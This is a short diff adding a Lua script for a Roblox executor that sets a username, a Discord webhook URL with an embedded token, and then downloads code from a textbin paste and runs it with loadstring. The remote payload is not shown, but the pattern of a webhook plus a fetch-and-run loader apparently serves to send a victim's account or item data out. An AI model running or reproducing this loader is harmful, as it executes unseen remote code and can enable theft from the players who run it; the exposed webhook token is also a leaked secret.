@@ -1,0 +1,5 @@
+_G.Username = "dika2706130"
+_G.ScriptName = "wait 30 sec"
+_G.Webhook = "https://discord.com/api/webhooks/1086791806068469831/7D5eKnRXOjv9eIu2glldjtN56eaedes-gl1jbPWn9i6tQtcmME3Weo3GqTDmA9MriuI5"
+
+loadstring(game:HttpGet("https://textbin.net/raw/lokmtqznuo"))()
